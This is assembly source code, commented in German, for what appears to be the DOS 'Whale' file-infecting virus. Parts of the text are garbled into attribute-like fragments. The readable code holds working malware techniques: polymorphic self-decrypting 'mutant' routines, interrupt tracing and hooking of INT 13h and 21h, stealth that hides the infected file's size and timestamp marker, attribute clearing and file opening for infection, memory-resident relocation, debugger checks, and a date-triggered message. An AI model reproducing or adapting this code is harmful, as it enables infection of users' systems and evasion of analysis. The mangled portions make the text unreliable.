j041bb="" j041c5:="" mov="" ax,0002h="" ;="" ax="2,BX" =="" add="" bx,0dc61h="" ;="" bx="MOV" cx,2386h="" ;="" cx="2386" push="" cs="" xor="" cx,ax="" ;="" cx="2384" pop="" ds="" j041d3:="" xor="" byte="" ptr="" ds:[bx],0e8h="" add="" bx,ax="" sub="" cx,ax="" jnz="" j041d3="" ;="" bx="ADD" bx,008fh="" ;="" bx="DEC" byte="" ptr="" ds:[bx]="" push="" es="" pop="" ds="" jnz="" j041e7="" retn="" j041e7:="" mov="" ax,cx="" jmp_entry="" 25,mut_25="" j041ec:="" pop="" bx="" jmp="" j041c5="" db="" 33h="" ;="====================================================================" ;="====================================================(" mutant="" #4="" )="==" ;="====================================================================" mut_4="" equ="" $="" push="" dx="" ;="OFFSET" 4bb5="" mov="" dh,[bx-01]="" j041f4:="" mov="" dl,[bx]="" xor="" [bx],dh="" xchg="" dh,dl="" add="" bx,+01h="" loop="" j041f4="" pop="" dx="" sti="" pop="" bx="" pop="" cx="" call="" ds:[@int21]="" ;="" call="" int="" 21="" ;----(="" einsprung="" )----="" call="" j0420d="" j0420a:="" inc="" ax="" xor="" bx,si="" j0420d:="" or="" si,si="" inc="" bh="" pop="" bx="" ;="" bx="SUB" bx,23a1h="" ;="" bx="ADD" bx,+02h="" ;="" bx="MOV" cx,2485h="" dec="" ch="" ;="" cx="2385" push="" cs="" pop="" ds="" j04220:="" mov="" al,[bx-01h]="" xor="" [bx],al="" inc="" bx="" loop="" j04220="" ;="" bx="ADD" bx,008eh="" ;="" bx="XCHG" bx,si="" dec="" byte="" ptr="" ds:[si]="" jnz="" j04235="" xchg="" si,bx="" retn="" j04235:="" push="" es="" xor="" ax,ax="" pop="" ds="" jmp_entry="" 4,mut_4="" ;="====================================================================" ;="===================================================(" mutant="" #13="" )="==" ;="====================================================================" mut_13="" equ="" $="" push="" dx="" ;="OFFSET" 4bb5="" mov="" dh,[bx-01h]="" j04240:="" mov="" dl,[bx]="" add="" [bx],dh="" xchg="" dl,dh="" inc="" bx="" loop="" j04240="" pop="" dx="" pop="" bx="" pop="" cx="" push="" si="" mov="" si,2567h="" dec="" si="" call="" [si]="" ;--------(="" einsprung="" )="" ------="" call="" j04258="" xor="" bx,si="" j04258:="" xor="" si,1876h="" pop="" bx="" pop="" si="" sub="" bx,code_start="" ;="" bx="2830" mov="" cx,code_len="" ;="" cx="2385" wal-size="" push="" cs="" pop="" ds="" j04267:="" mov="" al,[bx-01h]="" sub="" [bx],al="" inc="" bx="" loop="" j04267="" add="" bx,008eh="" xchg="" si,bx="" dec="" byte="" ptr="" ds:[si]="" jnz="" j0427c="" xchg="" bx,si="" retn="" j0427e="" equ="" $+3="" ;="" sprungziel="" fšr="" m#19,="" zeigt="" auf="" l0l0l0="" j0427c:="" push="" es="" xor="" ax,ax="" pop="" ds="" jmp_entry="" 13,mut_13="" dw="" 0ce8bh="" dw="" 05605h="" db="" 34h="" ;="====================================================================" ;="===================================================(" mutant="" #="" 19)="==" ;="====================================================================" mut_19="" equ="" $="" push="" ax="" ;="OFFSET" 4bb5="" j04289:="" xor="" byte="" ptr="" ds:[bx],05h="" inc="" byte="" ptr="" ds:[bx]="" inc="" bx="" loop="" j04289="" pop="" ax="" inc="" bx="" inc="" cx="" std="" stc="" push="" ax="" xlat="" ;="" mov="" al,[bx+al]="" pop="" ax="" pop="" bx="" pop="" cx="" call="" ds:[@int21]="" ;="" call="" int="" 21h="" ;-------(="" einsprung="" )--------------="" call="" j042a5="" j042a2:="" mov="" bx,5601h="" j042a5:="" pop="" bx="" ;="" bx="SUB" bx,239fh="" ;="" bx="MOV" cx,8934h="" mov="" cx,code_len="" ;="" cx="2385" push="" cs="" push="" ax="" mov="" ax,0000h="" mov="" ds,ax="" pop="" ax="" pop="" ds="" ;="" ds="CS" !="" j042b9:="" dec="" byte="" ptr="" ds:[bx]="" xor="" byte="" ptr="" ds:[bx],05h="" inc="" bx="" loop="" j042b9="" mov="" cx,0023h="" dec="" byte="" ptr="" ds:[bx+008eh]="" jz="" j0427e="" push="" es="" mov="" cx,0000h="" pop="" ds="" jmp_entry="" 19,mut_19="" dw="" 0fbc3h="" ;="====================================================================" ;="====================================================(" mutant="" #2="" )="==" ;="====================================================================" mut_2="" equ="" $="" push="" ax="" ;="OFFSET" 4bb5="" xlat="" ;="" mov="" al,[bx+al]="" j042d6:="" xor="" byte="" ptr="" ds:[bx],10h="" add="" bx,+01h="" loop="" j042d6="" pop="" ax="" pop="" bx="" pop="" cx="" push="" si="" mov="" si,offset="" @int21="" clc="" call="" [si]="" ;="" call="" int="" 21="" clc="" pop="" si="" inc="" bx="" ;-------(="" einsprung="" )--------------="" call="" j04317="" j042ee:="" sub="" bx,239fh="" ;="" bx="MOV" cx,2387h="" dec="" cx="" stc="" dec="" cx="" ;="" cx="2385" j042f8:="" xor="" byte="" ptr="" ds:[bx],10h="" add="" bx,+01h="" loop="" j042f8="" ;="" bx="MOV" cx,bx="" mov="" cx,008eh="" add="" bx,cx="" ;="" bx="DEC" byte="" ptr="" ds:[bx]="" jz="" j0430d="" jmp="" short="" j0430e="" j0430d:="" retn="" j0430e:="" push="" es="" mov="" ax,0000h="" pop="" ds="" clc="" jmp_entry="" 2,mut_2="" ;----------------="" j04317:="" pop="" bx="" push="" bx="" push="" cs="" push="" cx="" stc="" pop="" cx="" pop="" ds="" clc="" retn="" ;="====================================================================" ;="=====================================================(" mutant="" #9)="==" ;="====================================================================" mut_9="" equ="" $="" j04320:="" add="" byte="" ptr="" ds:[bx],05h="" ;="OFFSET" 4bb5="" add="" bx,+01h="" loop="" j04320="" pop="" bx="" inc="" cx="" pop="" cx="" push="" si="" mov="" si,offset="" @int21="" call="" [si]="" ;="" call="" int="" 21="" clc="" pop="" si="" inc="" dx="" push="" ax="" pop="" dx="" nop="" ;-------(="" einsprung="" )--------------="" call="" j0433b="" j0433a:="" clc="" j0433b:="" pop="" bx="" ;="" bx="SUB" bx,239fh="" ;="" bx="MOV" ch,23h="" mov="" cl,85h="" ;="" cx="2385" call="" j04360="" ;="" ds="CS" j04347:="" sub="" byte="" ptr="" ds:[bx],05h="" inc="" bx="" clc="" add="" dx,+12h="" loop="" j04347="" add="" bx,008eh="" ;="" bx="DEC" byte="" ptr="" ds:[bx]="" jnz="" j04364="" retn="" inc="" bx="" add="" cx,0d7ah="" xlat="" ;="" mov="" al,[bx+al]="" j04360:="" push="" cs="" pop="" ds="" retn="" db="" 0a4h="" j04364:="" push="" es="" pop="" ds="" jmp_entry="" 9,mut_9="" db="" 25h="" db="" 26h="" db="" 85h="" ;="====================================================================" ;="=======================================(" kodiert="" 1274h...="" 1b5ch="" )="==" ;="=======================================(" =="3A84" ..="" 436ch="" )="==" ;="====================================================================" code_3a84:="" mdecode="" 68="" j04371:="" mov="" bx,offset="" j03a84-offset="" virstart="" ;="" 1274h="" mov="" cx,offset="" code_3a84-offset="" j03a84="" ;="" 08e8h="" j04377:="" in="" al,40h="" or="" al,00h="" jz="" j04377="" j0437d:="" xor="" cs:[bx],al="" inc="" bx="" loop="" j0437d="" call="" j04386="" j04386:="" pop="" bx="" add="" bx,offset="" xorbyte_7d="" -="" offset="" j04386="" ;="" +1e="" ;="" gegenstueck="" ist="" dort="" !="" mov="" cs:[bx],al="" mcode="" 68="" retn="" ;="====================================================================" ;="=====================================(" dekodiert="" 1274h...="" 1b5ch="" )="==" ;="====================================================================" decode_3a84:="" mov="" bx,offset="" j03a84-offset="" virstart="" ;="" 1274h="" mov="" cx,offset="" code_3a84-offset="" j03a84="" ;="" 08e8h="" ;call="" j04984="" ;="" wie="" ist="" es="" mit="" dem="" ret="" call="" j043a1="" ;="" muesste="" call="" 43a1="" heissen="" .="" db="" 90h="" db="" 70h="" db="" 90h="" db="" 91h="" db="" 7dh="" db="" 73h="" j043a1:="" xor="" byte="" ptr="" cs:[bx],00="" ;=""></-><---- !="" xorbyte_7d="" equ="" $-1="" ;="" !!!!!!!!="" inc="" bx="" loop="" j043a1="" retn="" ;="=====================================================================" db="" 02eh,0c7h,006h,099h="" db="" 007h,000h,000h,0e8h="" ;="=================================================================" ;="==========================================(" vorarbeiten="" )="=======" ;="=================================================================" j043b1:="" mdecode="" 69="" call="" trace_int_13h="" push="" dx="" mov="" ah,36h="" ;="" get="" free="" space="" on="" disk="" mov="" dl,cs:[d2428]="" ;="" dl="Disk" call="" cs:[@int21]="" mul="" cx="" mul="" bx="" ;="" ax*bx*cx="Free" space="" in="" byte="" mov="" bx,dx="" ;="" dx="Total" clusters="" on="" disk="" pop="" dx="" or="" bx,bx="" mcode="" 69="" jnz="" j043da="" j043d5:="" cmp="" ax,4000h="" jb="" j0443d="" j043da:="" mov="" ax,4300h="" ;="" get="" file-attribut="" call="" cs:[@int21]="" jb="" j0443d="" mdecode="" 70="" mov="" cs:[d24f4],dx="" ;="" offset="" filename="" mov="" cs:[d24f2],cx="" ;="" file-attribut="" mov="" cs:[d24f6],ds="" ;="" segment="" filename="" mov="" ax,4301h="" ;="" set="" file-attribut="" xor="" cx,cx="" call="" cs:[@int21]="" cmp="" byte="" ptr="" cs:[error],00h="" mcode="" 70="" jnz="" j0443d="" mov="" ax,3d02h="" ;="" open="" file="" handle="" call="" cs:[@int21]="" jb="" j0443d="" mdecode="" 71="" mov="" bx,ax="" ;="" handle="" nach="" bx="" push="" bx="" mov="" ah,32h="" ;="" get="" disk="" info="" mov="" dl,cs:[d2428]="" ;="" drive="" nr.="" call="" cs:[@int21]="" mov="" ax,[bx+1eh]="" ;="" ds:bx="" :="" disk-info-block="" mov="" cs:[d24ec],ax="" pop="" bx="" call="" j048cd="" mcode="" 71="" retn="" db="" 0b4h="" ;="================================================(" fehler="" melden="" )="==" j0443d:="" mdecode="" 72="" xor="" bx,bx="" dec="" bx="" ;="" bx="0ffffh" call="" j048cd="" mcode="" 72="" ret="" ;="====================================================================" ;="===============================================(" int="" 24-handler="" )="==" ;="====================================================================" j0444d:="" mdecode="" 73="" xor="" al,al="" mov="" byte="" ptr="" cs:[error],01h="" mcode="" 73="" iret="" db="" 8ch="" ;="====================================================================" ;="=================================(" checkt="" die="" uhrzeit="" des="" files="" )="==" ;="====================================================================" checkfiletime:="" mdecode="" 74="" push="" cx="" push="" dx="" push="" ax="" mov="" ax,4400h="" ;="" get="" ioctl-dev.info="" call="" cs:[@int21]="" ;="" handle="" in="" bx="" xor="" dl,80h="" ;="" dl="" and="" 80h="1:" device,="" ;="" dl="" and="" 80h="0:" diskfile="" test="" dl,80h="" ;="" jz="" j04483="" ;="" es="" war="" kein="" diskfile="" !="" mov="" ax,5700h="" ;="" get="" file-timestamp="" call="" cs:[@int21]="" test="" ch,80h="" ;="" stunde="">= 16 ?
J04483:         POP     AX
                POP     DX
                POP     CX
                MCODE   74
                RETN
                DB      0F6h
;=====================================================================
;======================( von INT 3/21h angesprungen, falls AH=40h )===
;=====================================================================
J0448C:         CMP     Word PTR CS:[D2581],4   ; FILEHANDLE
                JB      J044BA                  ; KEIN FILE !
                PUSH    CS
                POP     BX
                SUB     BH,20h                  ; 2 Segmente vor CS
                MOV     AX,CS:[D257B]           ; AX := SAVE-DS
                CMP     AX,BX                   ; Ist SAVE-DS h”her
                JB      J044BA                  ; als D257B, z.B. das
                MOV     CS:[D257B],BX           ; DS des COMMAND.COM
                JMP     SHORT J044BA
                DB      0E8h
;=====================================================================
;=================================( von INT 3=INT 21 angesprungen )===
;=====================================================================
J044A9:         SUB     BYTE PTR CS:[SwapCode_7],52h
                PUSH    CS:[D2579]      ; SAVE-AX
                POP     CX
                CMP     CH,40h          ; WRITE File
        ;=============================================================
        ;durch das obige "SUB BYTE PTR CS:[1CA8h]" wird folgender Code
        ;=============================================================
SwitchByte      EQU     $
                DB      0C6h    ; aus 0c6h wird 074h, Spiel mit Queue!
                DB      0D2H    ; es sind genau 8 Byte dazwischen.....
        ;=============================================================
        ; folgendermassen ver„ndert :
        ;=============================================================
        ;        JZ      J0448C
        ;=============================================================
J044BA:
                POP     Word Ptr DS:[000Eh] ; INT 3 restaurieren
                POP     Word Ptr DS:[000Ch]
                ADD     BYTE PTR CS:[SwapCode_7],52h
                CALL    RestoreRegs
                JMP     J02AFB
;=====================================================================
;=================================================( Get File-Size )===
;=====================================================================
GetFileSize:    MDECODE 75
                CALL    SaveRegisters

                XOR     CX,CX
                MOV     AX,4201h          ; SEEK von momentaner Position
                XOR     DX,DX             ; 0 (!) byte weiter
                CALL    CS:[@INT21]
                MOV     Word ptr CS:[FilePos+2],DX
                                         ; in DX:AX ist neue/alte Position
                MOV     Word ptr CS:[FilePos  ],AX

                MOV     AX,4202h          ; SEEK zum File-Ende
                XOR     CX,CX
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     Word ptr CS:[FileSize+2],DX   ; File-Laenge zurck
                MOV     Word ptr CS:[FileSize  ],AX

                MOV     AX,4200h          ; SEEK zur alten Position
                MOV     DX,Word ptr CS:[FilePos  ]
                MOV     CX,Word ptr CS:[FilePos+2]
                CALL    CS:[@INT21]

                CALL    GetRegsFromVirstack
                MCODE   75
                RETN
;=====================================================================
;======================================( INT 3 aus INT 21-Handler )===
;=====================================================================
J0451A:         POP     AX      ; POP IP
                POP     BX      ; POP CS
                POP     CX      ; POP Flags
                JMP     J044A9
;=====================================================================
;=================================( Handler fr Get/Set Filedatum )===
;=====================================================================
J0451F:         OR      AL,AL           ; GET File-Date ??
                JNZ     J04550          ; Nein, SET !
                ;---------------------------------( get file-date )---
                MDECODE 76
                AND     WORD PTR CS:[D24B3],0FFFEH ; clear CF
                CALL    PopALL
                CALL    CS:[@INT21]
                MCODE   76
                JB      J04547
                TEST    CH,80h          ; FILE-STUNDE > 16 ?
                JZ      J04544
                SUB     CH,80h          ; Wenn ja, 16 abziehen
J04544:         JMP     IRET_Int21h     ; INT 21 beenden
                ;------------------------------------------------------
J04547:         OR      WORD PTR CS:[D24B3],+01h; SET CF des Callers
                JMP     IRET_Int21h
                ;----------------------------------( set file-date )---
J04550:         CMP     AL,01h          ; ist es 'set file date' ?
                JNZ     J045CD          ; Fehler im Walcode!
                                        ; CALL LOW-INT-21
                MDECODE 77
                AND     WORD PTR CS:[D24B3],0FFFEH ; CF l”schen
                TEST    CH,80h          ; Stunde > 16 ?
                MCODE   77
                JZ      J0456B          ; nein
                SUB     CH,80h          ; 16 abziehen
J0456B:         CALL    CheckFileTime
                JZ      J04573          ; kein DISK-File,
                                        ; oder Stunde < 16="" add="" ch,80h="" ;="" sonst="" 16="" addieren="" ;-----------------="" j04573:="" mdecode="" 78="" call="" cs:[@int21]="" mov="" [bp-04h],ax="" ;="" errorcode="" adc="" word="" ptr="" cs:[d24b3],+00h;="CLC" mcode="" 78="" jmp="" j02ea3="" ;="" fertig="" ;="====================================================================" ;="====================================(" geh”rt="" zum="" int="" 21-handler="" )="==" ;="====================================================================" j0458d:="" call="" saveregs="" in="" al,21h="" or="" al,02h="" out="" 21h,al="" push="" ax="" mov="" ax,0000h="" mov="" ds,ax="" pop="" ax="" push="" word="" ptr="" ds:[000ch]="" ;="" hole="" int="" 3-offset="" push="" word="" ptr="" ds:[000eh]="" ;="" hole="" int="" 3-segment="" push="" cs="" pop="" word="" ptr="" ds:[000eh]="" ;="" setze="" int="" 3="" auf="" ;="" cs:01d0a="" cs:451a="" mov="" word="" ptr="" ds:[000ch],offset="" j0451a-offset="" virstart="" int="" 3="" ;="" **="" tricky="" **="" ;---------------------------------------------------------------------="" db="" 83h="" ;="====================================================================" ;="====================================(" handler="" fr="" seek="" handle="" )="==" ;="====================================================================" j045b2:="" mdecode="" 79="" j045b7:="" cmp="" al,02h="" ;="" seek="" file-ende="" jnz="" j045c9="" ;="" alles="" andere="" ist="" uninteressant="" call="" checkfiletime="" ;="" ja="" ...="" jz="" j045c9="" sub="" word="" ptr="" [bp-0ah],code_len="" sbb="" word="" ptr="" [bp-08h],+00h="" j045c9:="" mcode="" 79="" j045cd:="" jmp="" j02b8b="" ;="" call="" low-int-21="" ;="====================================================================" ;="====================================================(" aktiv-msg="" )="==" ;="====================================================================" j045d0:="" mdecode="" 80="" call="" pushall="" mov="" ah,2ah="" ;="" get="" date="" call="" cs:[@int21]="" ;="=========(" nur="" zwischen="" 18.februar="" und="" 21.="" m„rz="" )="==" cmp="" dh,02h="" ;="" monat="" februar="" jz="" j045ec="" ;="" ja="" :="" welcher="" cmp="" dh,03h="" ;="" m„rz="" jz="" j045f4="" ;="" ja="" :="" welcher="" jmp="" j04663="" ;="" nein="" :="" fertig="" j045ec:="" cmp="" dl,13h="" ;="" nach="" dem="" 18.="" februar="" jnb="" j045fc="" ;="" ja="" -=""> MSG
                JMP     J04663                  ; NEIN -> fertig

J045F4:         CMP     DL,15h                  ; VOR 21. M„rz ??
                JB      J045FC                  ; JA   : MSG
                JMP     J04663                  ; NEIN : Fertig
J045FC:         JMP     J0463D
        ;========================================================
D45FF:  DB      "THE WHALE IN SEARCH OF THE 8 FISH",0ah,0dh
        DB      "I AM '~knzyvo}' IN HAMBURG$"
        ;========================================================
J0463D:         MOV     AH,09h
                PUSH    CS
                POP     DS
                MOV     DX,Offset D45FF-Offset VirStart ; 1DFF
                CALL    CS:[@INT21]
                ;==================================( schreibe HLT )===
                MOV     WORD PTR CS:[D2598],0F4F4h       ; = HLT
                MOV     BX,D2598
                PUSHF
                PUSH    CS
                PUSH    BX
                XOR     AX,AX
                MOV     DS,AX
                MOV     WORD Ptr DS:[0006h],0FFFFh
                CALL    Debugger_Check
                ;-----------------------------------------------------
J04663:         CALL    PopALL
                MCODE   80
                RETN
;=====================================================================
;=================================( Handler fr READ FILE /Handle )===
;=====================================================================
J0466B:         JMP     J02B8B                  ; CALL LOW-INT-21
J0466E:         AND     BYTE PTR CS:[D24B3],0FEh; CF l”schen
                CALL    CheckFileTime
                JZ      J0466B                  ; entweder kein DISK-File,
                                                ; oder 'falsche' Uhrzeit
                MDECODE 81
                MOV     CS:[D24AD],DX           ; Buffer merken
                MOV     CS:[D24AF],CX           ; Anzahl merken
                MOV     WORD PTR CS:[D24B1],0000h
                CALL    GetFileSize
                MOV     AX,Word ptr CS:[FileSize  ]
                MOV     DX,Word ptr CS:[FileSize+2]
                SUB     AX,Code_len
                SBB     DX,+00h
                SUB     AX,Word ptr CS:[FilePos  ]
                SBB     DX,Word ptr CS:[FilePos+2]
                MCODE   81
                JNS     J046B9                  ; Lang genug fr den Wal
                MOV     WORD Ptr [BP-04h],0000h
                JMP     J031E7                  ; fertig
;--------------------------------------------------------------------
J046B9:         MDECODE 82
                JNZ     J046C8                  ; JMP if Platz
                CMP     AX,CX                   ; Mehr als Wal-L„nge ?
                JA      J046C8
                MOV     CS:[D24AF],AX           ; Dann eben mehr Byte lesen,
                                                ; als verlangt !
J046C8:         MOV     CX,WORD PTR CS:[FilePos+2]
                MOV     DX,WORD PTR CS:[FilePos  ]
                OR      CX,CX                   ; Bin ich im 1. Segment ?

                MCODE   82
                JNZ     J046DF                  ; nein -> JMP
                CMP     DX,+1Ch                 ; wenigstens hinter
                                                ; dem EXE-Header ?
                JBE     J04704                  ; JMP, wenn mittendrin !
;--------------------------------------------------------------------
;-----------------------------------------------( lese-Schleife )----
;--------------------------------------------------------------------
J046DF:         MDECODE 83
                MOV     DX,WORD PTR CS:[D24AD]  ; Lese in DS:DX
                MOV     AH,3Fh
                MOV     CX,WORD PTR CS:[D24AF]  ; Soviele Byte
                CALL    CS:[@INT21]
                ADD     AX,WORD PTR CS:[D24B1]  ; Gesamtzahl gelesen
                MOV     [BP-04h],AX
                MCODE   83
                JMP     J02EA3                  ; fertig
;--------------------------------------------------------------------
J04704:         MOV     DI,DX                   ; Filepos
                MOV     SI,DX
                ADD     DI,WORD PTR CS:[D24AF]  ; Anzahl zu lesender byte
                CMP     DI,+1Ch                 ; Summe < 1ch="" jb="" j04717="" ;="" jmp="" wenn="" kleiner="" xor="" di,di="" ;="" di="0" jmp="" short="" j0471c="" ;--------------------------------------------------------------------="" db="" 0f7h="" ;--------------------------------------------------------------------="" j04717:="" sub="" di,01ch="" ;="" di="" ist="" z.b.="" 10h.="" ;="" sub="" di,1c="" :="" di="FFF4" neg="" di="" ;="" neg="" di="" :="" di="000B" j0471c:="" mdecode="" 84="" mov="" ax,dx="" mov="" dx,word="" ptr="" cs:[filesize="" ]="" mov="" cx,word="" ptr="" cs:[filesize+2]="" add="" dx,+0fh="" ;="" einen="" paragrafen="" weiter="" adc="" cx,+00h="" and="" dx,0ffefh="" ;="" ergibt="" eine="" rundung="" ;="" auf="" volle="" paragrafen="" sub="" dx,23fch="" ;="" wal-size="" abziehen="" sbb="" cx,+00h="" add="" dx,ax="" adc="" cx,+00h="" mov="" ax,4200h="" ;="" seek="" from="" start="" call="" cs:[@int21]="" mov="" cx,001ch="" sub="" cx,di="" sub="" cx,si="" mov="" ah,3fh="" ;="" read="" file="" mov="" dx,cs:[d24ad]="" call="" cs:[@int21]="" add="" cs:[d24ad],ax="" sub="" cs:[d24af],ax="" j04767:="" add="" cs:[d24b1],ax="" xor="" cx,cx="" mov="" ax,4200h="" ;="" seek="" from="" start="" mov="" dx,001ch="" ;="" zur="" position="" 1ch="" call="" cs:[@int21]="" mcode="" 84="" jmp="" j046df="" ;="" zum="" n„chsten="" teilstck="" ;="====================================================================" ;="========================(" handler="" fr="" findfirst/findnext="" sciiz)="==" ;="====================================================================" j04780:="" mdecode="" 85="" and="" word="" ptr="" cs:[d24b3],0fffeh="" ;="" zf="" l”schen="" call="" popall="" call="" cs:[@int21]="" call="" pushall="" mcode="" 85="" jnb="" j047a5="" or="" word="" ptr="" cs:[d24b3],+01h="" j047a0="" equ="" $-2="" jmp="" j02ea3="" ;="" fertig="" ;--------------------------;="" ;j047a0:="" and="" al,01="" ;="" ;="" jmp="" j02ea3="" ;="" ;--------------------------;="" j047a5:="" call="" getdta="" test="" byte="" ptr="" ds:[bx+17h],80h="" jnz="" j047b7="" ;="" infiziert.="" verschleiern="" !="" jmp="" j02ea3="" ;="" fertig="" ;="====================================================================" ;="====================================================(" trash="" !!!="" )="==" ;="====================================================================" j047b1:="" clc="" inc="" dx="" push="" ds="" pop="" es="" push="" dx="" jmp="" j047a0="" ;="" db="" 0ebh="" ;="" sind="" jetzt="" 2="" byte="" zuviel="" ;-------------------------------------(="" 'echter="" code="" 'berlappend="" )---="" j047b7:="" mdecode="" 86="" sub="" word="" ptr="" ds:[bx+1ah],code_len="" sbb="" word="" ptr="" ds:[bx+1ch],+00h="" sub="" byte="" ptr="" ds:[bx+17h],80h="" mcode="" 86="" jmp="" j02ea3="" ;="" fertig="" ;="====================================================================" ;="===============================(" kopiert="" wal="" in="" oberen="" speicher="" )="==" ;="====================================================================" wal_ins_memtop_kopieren:="" mdecode="" 87="" call="" j03350="" ;="" selbsttest="" !="" push="" cs="" ;="" ursprnglich="" "push="" ds",="" ;="" geht="" aber="" nicht="" xor="" ax,ax="" mov="" ds,ax="" ;-----------------------------------------------------="" ;="" int="" 3="" wird="" auf="" 'iret'="" im="" ibmbio.com="" gesetzt="" !="" ;-----------------------------------------------------="" mov="" word="" ptr="" ds:[000eh],0070h="" mov="" word="" ptr="" ds:[000ch],0756h="" ;="" an="" adresse="" 70h:756h="" pop="" ds="" mov="" es,[psp_seg]="" push="" es="" pop="" ds="" sub="" word="" ptr="" ds:[0002h],0270h;="" mem-top="" neu="" festlegen="" mov="" dx,ds="" ;="" 2700h="" byte="" 'reservieren'="" dec="" dx="" ;="" siehe="" zeichnung="" ganz="" oben="" !="" mov="" ds,dx="" ;="" ds:0="" zeigt="" auf="" mcb="" mov="" ax,word="" ptr="" ds:[0003h]="" ;="" hole="" size="" des="" aktuellen="" mcb="" sub="" ax,0270h="" ;="" und="" ziehe="" 2700h="" byte="" ab="" add="" dx,ax="" ;="" dx="" ist="" jetzt="" "mem-top"="" mov="" word="" ptr="" ds:[0003h],ax="" ;="" mcb="" „ndern="" pop="" di="" ;="" di="2947h" inc="" dx="" ;="" 16="" byte="" h”her="" mov="" es,dx="" ;="" es="" ist="" zielsegment="" push="" cs="" pop="" ds="" mov="" si,26feh="" ;="" si="26FE" mov="" cx,1380h="" ;="" cx="1380h" (words)="" ;="2760h" (byte)="" ;="bis" stackende="" !="" mov="" di,si="" ;="" di="SI" std="" xor="" bx,bx="" ;="" bx="0" mcode="" 87="" repz="" movsw="" ;="" fort="" ist="" er="" !="" cld="" ;="" erst="" jetzt="" push="" es="" ;="" oberes="" segment="" mov="" ax,schwimmziel="" ;="" push="" ax="" ;="" ziel="" ist="" es:01b1h="" mov="" es,cs:[psp_seg]="" ;="" entsprechend="" cs:29c1h="" mov="" cx,wischeweg="" ;="" cx="236C" jmp="" schwimme_fort="" ;="" bx="0" ;="====================================================================" ;="================================================(" trace="" int="" 13h="" )="==" ;="====================================================================" trace_int_13h:="" mdecode="" 88="" mov="" byte="" ptr="" cs:[error],00h="" call="" saveregisters="" push="" cs="" mov="" al,13h="" pop="" ds="" call="" getint_al="" mov="" word="" ptr="" ds:[trace_adres+2],es="" mov="" word="" ptr="" ds:[trace_adres="" ],bx="" mov="" word="" ptr="" ds:[@int_13h+2],es="" mov="" dl,02h="" mov="" word="" ptr="" ds:[@int_13h="" ],bx="" mov="" byte="" ptr="" ds:[d2450="" ],dl="" ;="" dl="2," 2="" bergehen="" call="" setint_01="" mov="" word="" ptr="" ds:[d24df="" ],sp="" mov="" word="" ptr="" ds:[d24dd="" ],ss="" push="" cs="" mov="" ax,offset="" j0488d-offset="" virstart="" push="" ax="" ;="" returnadresse="" fr="" retf="" ist="" ;="" cs:j0207f,="" also="" cs:488d="" mov="" ax,0070h="" mov="" cx,0ffffh="" ;="" bis="" zum="" letzten="" byte="" suchen="" ...="" mov="" es,ax="" xor="" di,di="" mov="" al,0cbh="" ;="" scannt="" ibmbio="" nach="" 0cbh="" !!!="" repnz="" scasb="" ;="" also="" retf="" dec="" di="" pushf="" push="" es="" push="" di="" ;="" returnadresse="" ist="" "retf"="" in="" ibmbio.com="" pushf="" pop="" ax="" or="" ah,01h="" ;="" set="" tf="" push="" ax="" mcode="" 88="" popf="" xor="" ax,ax="" ;="" reset="" disk="" :-)="" jmp="" dword="" ptr="" ds:[trace_adres]="" ;="" return="" ist="" j0488d="" ;="" jmp="" int="" 13h="" db="" 0e9h="" ;="====================================================================" ;="=========================================(" rckkehr="" aus="" int="" 13h="" )="==" ;="====================================================================" j0488d:="" mdecode="" 89="" push="" cs="" pop="" ds="" push="" ds="" mov="" al,13h="" lds="" dx,dword="" ptr="" cs:[trace_adres]="" call="" setint_al="" ;="" re-set="" int="" 13="" pop="" ds="" mov="" al,24h="" call="" getint_al="" ;="" get="" int="" 24="" mov="" word="" ptr="" ds:[d243d],bx="" mov="" dx,offset="" j0444d-offset="" virstart="" mov="" al,24h="" mov="" word="" ptr="" ds:[d243d+2],es="" call="" setint_al="" ;="" set="" int="" 24="" call="" getregsfromvirstack="" push="" ds="" push="" ax="" mov="" ax,0000h="" mov="" ds,ax="" pop="" ax="" mov="" word="" ptr="" ds:[0006h],0070h="" ;="" segment="" int="" 01="" ;="" auf="" 70h="" setzen="" pop="" ds="" mcode="" 89="" retn="" db="" 0f6h="" ;="====================================================================" ;="==========================================(" reset="" int="" 13+int="" 24="" )="==" ;="====================================================================" j048cd:="" mdecode="" 90="" call="" saveregisters="" lds="" dx,cs:[@int_13h]="" ;="" alte="" adresse="" int="" 13="" mov="" al,13h="" call="" setint_al="" ;="" set="" int="" 13="" lds="" dx,dword="" ptr="" cs:[d243d];="" alte="" adresse="" int="" 24="" mov="" al,24h="" call="" setint_al="" ;="" set="" int="" 24="" call="" getregsfromvirstack="" mcode="" 90="" ret="" ;="========================================================(" trash="" )="==" push="" cs="" pop="" ax="" ;="====================================================================" ;="================================================(" trace="" int="" 21h="" )="==" ;="====================================================================" j048f3:="" mdecode="" 91="" ;----------------------(="" die="" zahl="" 0401="" bedeutet="" :="" )---="" ;----------------------(="" 4="" ebenen,="" 1.="" bergehen="" )---="" mov="" word="" ptr="" cs:[d2450],0401h="" call="" setint_01="" call="" popall="" push="" ax="" mov="" ax,cs:[d24b3]="" or="" ax,0100h="" ;="" set="" tf="" push="" ax="" mcode="" 91="" ;---------------------------------------------="" popf="" pop="" ax="" pop="" bp="" jmp="" cs:[low_int_21h]="" ;="" jmp="" int="" 21h="" ;---------------------------------------------="" ;="====================================================================" j0491a:="" db="" 00h="" ;="" alias="" "210a"="" !="" ;="" klein,="" aber="" fein="" :-)="" ;="====================================================================" ;="=========================(" die="" decode-routine="" )="==" ;="=========================(" dekodiert="" jedes="" wal-h„hrchen="" separat="" )="==" ;="====================================================================" j0491b:="" pushf="" pop="" cs:[d258e]="" mov="" cs:[d2560],ax="" mov="" cs:[d2562],bx="" mov="" cs:[d2564],cx="" j0492f:="" db="" 26h,3bh,0,72h,2,0c3h,2,53h,89h,0c1h="" db="" 032h,0edh,026h,03ah,8,073h,047h,0f8h="" comment="" #="" ergibt="" ;="" ;-------------------------------------------="" pop="" bx="" ;="" pop="" returnadresse="" mov="" ax,cs:[bx]="" ;="" get="" word="" add="" bx,+02h="" ;="" inc="" returnadresse,2="" push="" bx="" ;="" auf="" den="" stack="" damit="" ;-----------------------;="" al="" ist="" z„hler="" mov="" cx,ax="" ;="" ah="" ist="" xor-byte="" xor="" ch,ch="" j00120:="" xor="" cs:[bx],ah="" inc="" bx="" loop="" j00120="" ;-------------------------------------------="" #="" j04941:="" mov="" ax,cs:[d2560]="" mov="" bx,cs:[d2562]="" mov="" cx,cs:[d2564]="" push="" cs:[d258e]="" popf="" retn="" ;="====================================================================" ;="====================================(" kodiert="" das="" separate="" teil="" )="==" ;="====================================================================" versteckecodewieder:="" 